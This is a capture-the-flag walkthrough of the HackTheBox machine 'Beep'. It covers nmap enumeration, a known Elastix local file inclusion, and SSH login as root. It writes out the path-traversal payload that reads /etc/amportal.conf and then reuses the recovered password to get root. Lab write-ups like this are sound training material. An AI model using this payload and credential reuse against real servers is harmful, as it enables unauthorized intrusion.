# Beep - HackTheBox

IP : 10.10.10.7

### Enumeration

#### Nmap

```
nmap -T4 -sC -sV -p- 10.10.10.7

22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://beep.htb/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: USER STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) RESP-CODES UIDL AUTH-RESP-CODE APOP TOP EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: SORT=MODSEQ ATOMIC CONDSTORE OK URLAUTHA0001 LISTEXT CHILDREN LIST-SUBSCRIBED X-NETSCAPE UIDPLUS IDLE LITERAL+ THREAD=ORDEREDSUBJECT ID ANNOTATEMORE UNSELECT IMAP4 IMAP4rev1 QUOTA RENAME Completed ACL MAILBOX-REFERRALS NO SORT THREAD=REFERENCES STARTTLS CATENATE BINARY NAMESPACE MULTIAPPEND RIGHTS=kxte
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-03-13T19:49:58+00:00; +1h03m36s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

#### HTTP - Port 80/443

By visiting the web site, we are redirected on port 443.

On this port, we have a login page for a `elastix` software. elsatix seems to be an TOIP software.

Let's check if some exploits exist. We found one :

- https://www.exploit-db.com/exploits/37637

It seems there is a Local File Inclusion on Elastix. This LFI is located at :

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

We find credentials in this file :

- admin:jEhdIekWmdjE

We can log in with these credentials.

After several reverse shells upload attempts on port 443, we try to connect in SSH with the credentials found.

#### SSH - Port 22

We have just one user : admin, so let's try to connect with `root` user :

```
ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```
We've got an error. This issue is known, we can escapte it as follow :

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
Password : jEhdIekWmdjE

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

We can get the flags in `/home/fanis/user.txt` and `/root/root.txt` !
